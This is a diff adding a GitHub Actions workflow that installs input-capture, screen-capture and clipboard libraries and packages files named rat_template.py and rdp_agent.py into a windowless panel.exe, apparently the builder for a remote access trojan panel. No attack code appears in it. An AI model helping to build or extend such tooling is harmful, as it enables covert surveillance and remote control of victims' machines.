@@ -1,0 +1,36 @@
+# language: YAML, file: .github/workflows/build.yml
+name: build
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  windows-build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller pyqt5 keyboard pyautogui pillow psutil pyperclip mss numpy
+
+      - name: Syntax check
+        run: python -m py_compile panel.py rat_template.py rdp_agent_lib.py rdp_agent.py rdp_operator.py
+
+      - name: Build single panel.exe
+        run: |
+          pyinstaller --onefile --noconsole --name panel --hidden-import=PyQt5.QtCore --hidden-import=PyQt5.QtGui --hidden-import=PyQt5.QtWidgets --add-data "rat_template.py;." --add-data "rdp_agent_lib.py;." --add-data "rdp_agent.py;." --add-data "rdp_operator.py;." --add-data "IMG_9448.jpeg;." panel.py
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: panel-build
+          path: dist/panel.exe
+          retention-days: 14
